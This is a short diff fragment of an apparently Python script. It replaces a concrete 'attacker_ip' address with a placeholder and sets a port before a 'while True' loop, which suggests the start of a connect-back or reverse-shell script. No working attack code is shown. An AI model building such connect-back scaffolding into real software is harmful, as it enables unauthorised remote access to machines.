@@ -3,7 +3,7 @@ import subprocess
 import time
 import os
 
-attacker_ip = '84.229.211.141'
+attacker_ip = 'IP'
 port = 87
 
 while True:
